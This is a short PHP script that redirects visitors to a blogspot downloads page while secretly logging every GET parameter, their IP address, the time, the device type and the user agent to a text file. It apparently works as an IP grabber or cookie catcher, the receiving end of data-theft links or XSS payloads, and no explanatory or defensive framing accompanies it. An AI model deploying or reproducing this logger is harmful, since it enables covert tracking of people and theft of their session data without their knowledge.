<?php
header ('Location: https://englishpandora.blogspot.com/2020/08/downloading-links.html?m=1');
$handle = fopen("log.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
    $date = (new DateTime())->setTimeZone(new DateTimeZone('Asia/Kolkata'))->format('Y-m-d H:i:s');
 fwrite($handle, $date . ': ' . $_SERVER['REMOTE_ADDR']."\n"); 
require_once 'Mobile_Detect.php';$detect = new Mobile_Detect;$deviceType = ($detect->isMobile() ? ($detect->isTablet() ? 'tablet' : 'phone') : 'computer');$scriptVersion = $detect->getScriptVersion();
	fwrite($handle,$deviceType);
fwrite($handle, ': ' . $_SERVER['HTTP_USER_AGENT']."\n");
fwrite($handle, '_________________________');
fclose($handle);
exit;
?>
